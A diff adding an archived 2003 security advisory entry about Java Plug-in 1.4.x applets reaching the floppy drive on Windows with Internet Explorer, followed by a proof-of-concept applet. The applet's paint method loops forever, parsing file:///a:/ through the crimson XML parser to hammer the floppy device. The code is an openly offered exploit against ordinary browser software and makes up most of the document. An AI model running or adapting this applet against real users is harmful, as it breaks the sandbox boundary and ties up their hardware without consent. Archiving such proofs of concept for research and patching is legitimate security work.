@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/8867/info
+
+A weakness has been reported in Java implementations that may constitute unauthorized access by Java applets to floppy devices. This weakness appears to present a flaw in the Java security model.
+
+This issue was reported in Java Plug-in 1.4.x versions on Microsoft Windows operating systems, when run with Internet Explorer. Other environments and versions may also be affected.
+
+import java.awt.Label;
+
+public class MyFloppySucks extends java.applet.Applet {
+private Label m_labVersionVendor;
+public MyFloppySucks () //constructor
+{
+m_labVersionVendor = new Label ("Java Floppy Stress Testing Applet,
+(2003) www.illegalaccess.org" +" / Java Version: " +
+System.getProperty("java.version")+
+" from "+System.getProperty("java.vendor"));
+this.add(m_labVersionVendor);
+}
+public void paint(java.awt.Graphics g) {
+while (1==1)
+try {
+
+org.apache.crimson.tree.XmlDocument.createXmlDocument("file:///a:/",false);
+}
+catch (Exception e) {
+System.out.println("Java Floppy Stress Testing Applet,
+(2003) www.illegalaccess.org");
+}
+}
+} 
